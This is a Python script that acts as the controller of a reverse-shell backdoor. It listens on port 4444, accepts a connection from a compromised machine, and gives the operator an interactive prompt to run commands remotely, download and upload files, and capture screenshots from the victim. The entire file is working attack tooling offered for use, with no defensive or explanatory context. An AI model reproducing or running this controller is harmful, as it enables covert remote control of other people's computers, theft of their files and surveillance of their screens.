#!/usr/bin/python

import socket
import json
import base64

counter = 1 # this is for screenshots

# send data
def sending(data):
    json_data = json.dumps(data)
    target.send(json_data)

# receiving data
def receiving():
    data = ""
    while True:
        try:
            # controlling data processing
            data = data + target.recv(4096)
            # return data to the shell function
            return json.loads(data)
        except ValueError:
            # continue the loop if the data sent is bigger than 1024
            continue

# socket setup
def setup():
    # global variables
    global s, ip, target
    # socket instance | AF_INET for IPv4 | SOCK_STREAM for TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # setting options (reusing socket object)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # binding option
    s.bind(("192.168.1.111", 4444))
    # listen for incoming connections (5 max)
    s.listen(1)
    print('[*] Listening for incoming connections')
    # getting information of the connection
    target, ip = s.accept()
    print("[+] Connection established from: %s" % str(ip))
    # closing socket
    s.close()

# sending and receiving messages
def shell():
    global counter
    while True:
        command = raw_input('[+] Shell#~%s: ' % str(ip))
        # send it to the target
        sending(command)
        if command == "q":
            break
        elif command[:2] == "cd" and len(command) > 1:
            print("[!] Command executed")
            continue
        elif command[:8] == "download":
            try:
                # after download
                with open(command[9:], "wb") as file: # wb = wrte bytes
                    data = receiving() # downloading function
                    file.write(base64.b64decode(data)) # writing to file (decoded file data - for images)
                    print("[!] Download success")
            except Exception as e:
                sending(base64.b64encode("[!] Failed to Download"))
        elif command[:6] == "upload":
            try:
                with open(command[7:], "rb") as file:
                    # sending the content of the file
                    sending(base64.b64encode(file.read())) # encoding file to base64
                    print("[!] Upload executed")
            except Exception as e:
                sending(base64.b64encode("[!] Failed to upload"))
        elif command[:10] == "screenshot":
            # grab the file
            with open("screenshot%d" % counter, "wb") as ss:
                image = receiving()
                # decode image
                decoded = base64.b64decode(image)
                # checking if saved
                if decoded[:3] == "[!]":
                    print(decoded)
                else:
                    ss.write(decoded)
                    counter += 1
        else:
            result = receiving()
            print(result)

if __name__ == "__main__":
    setup()
    shell()
    s.close()
